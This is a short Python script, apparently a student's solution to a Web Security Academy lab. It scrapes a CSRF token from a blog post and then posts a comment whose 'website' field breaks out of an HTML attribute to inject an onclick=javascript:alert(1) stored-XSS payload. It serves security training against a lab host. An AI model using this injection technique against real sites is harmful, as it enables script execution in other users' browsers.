import requests
from bs4 import BeautifulSoup

site = 'ac441f5a1edf0cb5c048709400f80044.web-security-academy.net'
s = requests.Session()

if __name__ == '__main__':
    blog_post_url = f'https://{site}/post?postId=1'
    resp = s.get(blog_post_url)
    soup = BeautifulSoup(resp.text, 'html.parser')
    csrf = soup.find('input', {'name': 'csrf'}).get('value')

    comment_url = f'https://{site}/post/comment'
    comment_string = '''Hello world!'''
    comment_data = {
        'csrf': csrf,
        'postId': '1',
        'comment': comment_string,
        'name': 'author',
        'email': 'author@email.com',
        'website': '''https://pdx.edu" onclick=javascript:alert(1) OdinId="bradlet2'''
    }
    resp = s.post(comment_url, data=comment_data)
    resp = s.get(blog_post_url)
    print(resp.text)
